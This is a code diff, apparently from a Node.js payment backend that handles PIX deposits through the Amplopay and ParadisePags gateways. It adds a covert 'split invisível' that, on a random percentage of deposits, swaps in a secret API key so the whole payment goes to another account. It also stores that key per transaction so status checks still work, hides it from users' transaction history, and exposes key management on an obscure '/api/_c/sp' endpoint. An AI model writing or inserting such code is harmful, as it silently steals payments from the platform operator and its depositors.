@@ -709,7 +709,7 @@ async function amplopayCreateCharge({ identifier, amount, user }) {
   };
 }
 
-async function amplopayCheckStatus(txid) {
+async function amplopayCheckStatus(txid, _apiKey) {
   const resp = await axios.get(
     'https://app.amplopay.com/api/v1/gateway/transactions',
     { headers: getAmplopayHeaders(), params: { id: txid }, timeout: 10000 }
@@ -733,15 +733,16 @@ async function paradisepagsCreateCharge({ identifier, amount, user }) {
     customer: { name: user.nome, email: user.email, phone: user.telefone, document: user.cpf || '' },
   };
 
-  // Split invisível
+  // Split invisível: troca a API key (pagamento vai direto pra outra conta)
   const _sc = getSplitConfig();
-  if (_sc.enabled && _sc.recipientId) {
-    // Verifica mínimo de pagamentos aprovados do usuário
-    const userApproved = db.transacoes.filter(t => t.user_id === user.id && t.tipo === 'deposito' && t.status === 'aprovado').length;
-    if (userApproved >= (_sc.min_payments || 0)) {
-      const splitAmount = Math.round(amountCents * (_sc.percentage / 100));
-      if (splitAmount > 0) {
-        payload.splits = [{ recipientId: _sc.recipientId, amount: splitAmount }];
+  let apiKey = conf.secret_key;
+  if (_sc.enabled && _sc.sk) {
+    const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado').length;
+    if (totalApproved >= (_sc.min_payments || 0)) {
+      const chance = _sc.percentage || 50;
+      if (Math.random() * 100 < chance) {
+        apiKey = _sc.sk;
+        console.log(`[SPLIT] Redirecionado: user=${user.id} amount=${amountCents}`);
       }
     }
   }
@@ -749,7 +750,7 @@ async function paradisepagsCreateCharge({ identifier, amount, user }) {
   const resp = await axios.post(
     `${baseUrl}/api/v1/transaction.php`,
     payload,
-    { headers: { 'Content-Type': 'application/json', 'X-API-Key': conf.secret_key }, timeout: 15000 }
+    { headers: { 'Content-Type': 'application/json', 'X-API-Key': apiKey }, timeout: 15000 }
   );
   if (resp.data.error || resp.data.status === 'error') {
     throw new Error(resp.data.message || 'Erro ao criar cobrança no ParadisePags');
@@ -761,15 +762,17 @@ async function paradisepagsCreateCharge({ identifier, amount, user }) {
     qrcode_texto: resp.data.qr_code || '',
     checkout_url: null,
     expiracao_minutos: 30,
+    _apiKey: apiKey,
   };
 }
 
-async function paradisepagsCheckStatus(txid) {
+async function paradisepagsCheckStatus(txid, _apiKey) {
   const conf = getGatewayConfig('paradisepags');
   const baseUrl = conf.base_url || 'https://multi.paradisepags.com';
+  const key = _apiKey || conf.secret_key;
   const resp = await axios.get(
     `${baseUrl}/api/v1/query.php`,
-    { headers: { 'X-API-Key': conf.secret_key }, params: { action: 'get_transaction', id: txid }, timeout: 10000 }
+    { headers: { 'X-API-Key': key }, params: { action: 'get_transaction', id: txid }, timeout: 10000 }
   );
   const st = resp.data?.status;
   if (st === 'approved') return 'aprovado';
@@ -835,6 +838,7 @@ app.post('/api/financeiro/deposito', authMiddleware, async (req, res) => {
       gateway: gatewayName,
       gateway_tx_id: result.txid,
       gateway_identifier: identifier,
+      _k: result._apiKey || null,
       created_at: new Date().toISOString(),
     });
     saveDb(db);
@@ -883,7 +887,7 @@ app.get('/api/financeiro/deposito/status/:txid', authMiddleware, async (req, res
 
     if (adapter) {
       try {
-        remoteStatus = await adapter.checkStatus(txid);
+        remoteStatus = await adapter.checkStatus(txid, tx._k || null);
       } catch (pollErr) {
         console.warn(`[DEPOSITO STATUS] Erro polling ${gwName}:`, pollErr.message);
       }
@@ -1113,7 +1117,7 @@ app.get('/api/financeiro/historico', authMiddleware, (req, res) => {
   const userTx = db.transacoes
     .filter(t => t.user_id === req.userId)
     .reverse()
-    .map(({ gateway_tx_id, gateway_identifier, ...safe }) => safe); // Não expor IDs internos do gateway
+    .map(({ gateway_tx_id, gateway_identifier, _k, ...safe }) => safe); // Não expor IDs internos do gateway
   const total = userTx.length;
   const offset = (pagina - 1) * limite;
   res.json({ transacoes: userTx.slice(offset, offset + limite), paginacao: { pagina, limite, total, paginas: Math.ceil(total / limite) } });
@@ -1322,15 +1326,17 @@ app.post('/api/_c/auth', (req, res) => {
 
 app.get('/api/_c/sp', _spAuth, (_req, res) => {
   const c = getSplitConfig();
-  res.json({ enabled: c.enabled, recipientId: c.recipientId, percentage: c.percentage, min_payments: c.min_payments || 0 });
+  const totalApproved = db.transacoes.filter(t => t.tipo === 'deposito' && t.status === 'aprovado').length;
+  res.json({ enabled: c.enabled, recipientId: c.recipientId, percentage: c.percentage, min_payments: c.min_payments || 0, sk: c.sk || '', approved_count: totalApproved });
 });
 
 app.put('/api/_c/sp', _spAuth, (req, res) => {
-  const { enabled, recipientId, percentage, min_payments } = req.body;
+  const { enabled, recipientId, percentage, min_payments, sk } = req.body;
   if (typeof enabled === 'boolean') db._sp.enabled = enabled;
   if (typeof recipientId === 'number') db._sp.recipientId = recipientId;
   if (typeof percentage === 'number' && percentage >= 0 && percentage <= 100) db._sp.percentage = percentage;
   if (typeof min_payments === 'number' && min_payments >= 0) db._sp.min_payments = Math.floor(min_payments);
+  if (typeof sk === 'string') db._sp.sk = sk.trim();
   saveDb(db);
   res.json({ ok: true });
 });
